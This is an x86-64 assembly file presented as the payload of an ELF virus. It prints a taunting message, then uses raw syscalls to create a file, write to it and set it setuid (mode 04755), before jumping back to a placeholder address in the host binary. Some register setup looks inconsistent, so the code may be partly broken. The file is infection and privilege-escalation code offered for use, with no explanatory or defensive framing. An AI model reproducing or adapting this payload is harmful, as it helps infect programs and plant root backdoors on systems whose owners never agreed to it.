; iAmRoot.asm
; author: MVladislav
; print Hey! I am an elf virus ;-)!\n and jump back
; jmp address is only a placeholder

section .text
  global iAmRoot

  iAmRoot:
    push    rax ; %rax %eax %ax %al
    push    rdi ; %rdi %edi %di %dil
    push    rsi ; %rsi %esi %si %sil
    push    rdx ; %rdx %edx %dx %dl

    xor     rdi, rdi
    xor     rax, rax
    mov     al, 1
    xor     rsi, rsi
    mov     rsi, 0x0a21292d3b207375 ; "us ;-)!\n" is stored in reverse order "..."
    push    rsi
    mov     rsi, 0x72697620666c6520 ; " elf vir" is stored in reverse order "..."
    push    rsi
    mov     rsi, 0x6e61206d61204920 ; " I am an" is stored in reverse order "..."
    push    rsi
    mov     rsi, 0x2179654800000000 ; "Hey!" is stored in reverse order "..."
    push    rsi

    mov     rsi, rsp
    xor     rdx, rdx
    mov     dl, 32
    syscall

    pop    rsi
    pop    rsi
    pop    rsi
    pop    rsi

    xor     edx,edx
    lea     esi,[rdx+0x41]
    lea     eax,[rdx+0x2]
    syscall
    lea     rsi,[rdi+0x8]
    mov     dl,0x3a
    mov     edi,eax
    mov     al,0x1
    syscall
    mov     al,0x5b
    mov     esi,0x9ed
    syscall
    pop     rdx
    pop     rsi
    pop     rdi
    pop     rax
    jmp     0xcf73
